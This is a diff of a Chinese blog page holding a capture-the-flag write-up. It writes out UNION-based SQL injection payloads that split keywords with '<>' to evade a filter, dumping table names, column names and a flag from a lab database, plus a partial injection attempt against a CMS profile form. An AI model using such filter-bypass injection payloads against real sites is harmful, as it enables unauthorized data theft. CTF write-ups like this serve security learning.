@@ -234,7 +234,7 @@
     </button>
 
     <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn">
-        <ol class="post-toc"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#一、sql"><span class="post-toc-number">1.</span> <span class="post-toc-text">一、sql</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#二、再见CMS"><span class="post-toc-number">2.</span> <span class="post-toc-text">二、再见CMS</span></a></li></ol>
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#undefined"><span class="post-toc-number">1.</span> <span class="post-toc-text">一、sql</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#undefined"><span class="post-toc-number">2.</span> <span class="post-toc-text">二、再见CMS</span></a></li></ol>
 
         <!--
         <li class="mdl-menu__item">
@@ -388,20 +388,23 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <h4 id="一、sql"><a href="#一、sql" class="headerlink" title="一、sql"></a>一、sql</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">php?id=1 un&lt;&gt;ion se&lt;&gt;lest 1,2,3</div><div class="line"></div><div class="line">回显 flag&#123;在数据库中&#125;</div><div class="line"></div><div class="line">2</div></pre></td></tr></table></figure>
+        <h4>一、sql</h4>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">php?id=1 un&lt;&gt;ion se&lt;&gt;lest 1,2,3</div><div class="line"></div><div class="line">回显 flag&#123;在数据库中&#125;</div><div class="line"></div><div class="line">2</div></pre></td></tr></table></figure></p>
 <p>第二个字段是可以显示的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">http://57013df126fb4ca4b3280f842df66e1df71ea932206644c2.game.ichunqiu.com/index.php?id=1 un&lt;&gt;ion s&lt;&gt;elect 1,group_concat(table_name),3 from information_schema.tables where table_schema = database()</div><div class="line"></div><div class="line">回显 flag&#123;在数据库中&#125;  </div><div class="line"></div><div class="line">info</div></pre></td></tr></table></figure>
-<a id="more"></a>
-<p>表名 info</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php?id=1 un&lt;&gt;ion s&lt;&gt;elect 1,gro&lt;&gt;up_con&lt;&gt;cat(column_name),3 from information_schema.columns where table_name = 0x696e666f</div></pre></td></tr></table></figure>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">http://57013df126fb4ca4b3280f842df66e1df71ea932206644c2.game.ichunqiu.com/index.php?id=1 un&lt;&gt;ion s&lt;&gt;elect 1,group_concat(table_name),3 from information_schema.tables where table_schema = database()</div><div class="line"></div><div class="line">回显 flag&#123;在数据库中&#125;  </div><div class="line"></div><div class="line">info</div></pre></td></tr></table></figure></p>
+<p>&lt;!--more--&gt;
+表名 info</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php?id=1 un&lt;&gt;ion s&lt;&gt;elect 1,gro&lt;&gt;up_con&lt;&gt;cat(column_name),3 from information_schema.columns where table_name = 0x696e666f</div></pre></td></tr></table></figure></p>
 <p>回显 405</p>
 <p>需要加几个&lt;&gt;再次过滤</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">index.php?id=1 un&lt;&gt;ion s&lt;&gt;elect 1,gro&lt;&gt;up_con&lt;&gt;cat(co&lt;&gt;lumn_name),3 from in&lt;&gt;formation_schema.columns where table_name = 0x696e666f</div></pre></td></tr></table></figure>
-<p>回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">flag&#123;在数据库中&#125;</div><div class="line"></div><div class="line">id,title,flAg_T5ZNdrm</div></pre></td></tr></table></figure></p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">index.php?id=1 un&lt;&gt;ion s&lt;&gt;elect 1,gro&lt;&gt;up_con&lt;&gt;cat(co&lt;&gt;lumn_name),3 from in&lt;&gt;formation_schema.columns where table_name = 0x696e666f</div></pre></td></tr></table></figure></p>
+<p>回显
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">flag&#123;在数据库中&#125;</div><div class="line"></div><div class="line">id,title,flAg_T5ZNdrm</div></pre></td></tr></table></figure></p>
 <p>字段名已经知道了，flAg_T5ZNdrm</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?id=1 un&lt;&gt;ion s&lt;&gt;elect 1,gro&lt;&gt;up_con&lt;&gt;cat(flAg_T5ZNdrm),3 from info</div></pre></td></tr></table></figure>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?id=1 un&lt;&gt;ion s&lt;&gt;elect 1,gro&lt;&gt;up_con&lt;&gt;cat(flAg_T5ZNdrm),3 from info</div></pre></td></tr></table></figure></p>
 <p>回显：flag{d3d59615-a0d4-4660-8b3e-8a5ba21c06ed},test</p>
-<h4 id="二、再见CMS"><a href="#二、再见CMS" class="headerlink" title="二、再见CMS"></a>二、再见CMS</h4><p>old_password=test11&amp;truename=xxxx%0000&amp;Limitword[000]=&amp;email=123@qq.com&amp;provinceid=,address=(select user())where uid =2 #</p>
+<h4>二、再见CMS</h4>
+<p>old_password=test11&amp;truename=xxxx%0000&amp;Limitword[000]=&amp;email=123@qq.com&amp;provinceid=,address=(select user())where uid =2 #</p>
 <p>好难好难，做不出来了</p>
 
     
@@ -573,7 +576,7 @@
         <li>
             <a href="/links" title="友情链接">
                 
-                    <i class="material-icons sidebar-material-icons">favourite</i>
+                    <i class="material-icons sidebar-material-icons">favorite</i>
                 
                 友情链接
             </a>
@@ -783,6 +786,106 @@ It will not impact the appearance and can give developers a lot of support :)
 
 
 <!-- Local Search-->
+
+    <script>
+    var searchFunc = function(path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: 'xml',
+            success: function( xmlResponse ) {
+                // get the contents from search data
+                var datas = $( 'entry', xmlResponse ).map(function() {
+                    return {
+                        title: $( 'title', this ).text(),
+                        content: $('content',this).text(),
+                        url: $( 'url' , this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function() {
+                    var str='<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = '';
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function(data) {
+                        var isMatch = true;
+                        var content_index = [];
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g,'').toLowerCase();
+                        var data_url = data.url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if(data_title !== '' && data_content !== '') {
+                            keywords.forEach(function(keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if( index_title < 0 && index_content < 0 ) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += '<li><a href="'+ data_url +'" class="search-result-title" target="_blank">'+ data_title;
+                            var content = data.content.trim().replace(/<[^>]+>/g, '');
+                            if (first_occur >= 0) {
+                                // cut out characters
+                                var start = first_occur - 6;
+                                var end = first_occur + 6;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 10;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function(keyword) {
+                                    var regS = new RegExp(keyword, 'gi');
+                                    match_content = match_content.replace(regS, '<em class="search-keyword">'+keyword+'</em>');
+                                })
+                                str += '<p class="search-result">' + match_content + '...</p>' +'</a>';
+                            }
+                        }
+                    });
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    }
+</script>
+
+
+    <script>
+        var inputArea = document.querySelector('#search');
+        var getSearchFile = function() {
+            var path = 'search.xml';
+            searchFunc(path, 'search', 'local-search-result');
+        }
+
+        if(inputArea) {
+            inputArea.onfocus = function() {
+                getSearchFile();
+            }
+        }
+    </script>
 
 
 <!-- Window Load-->
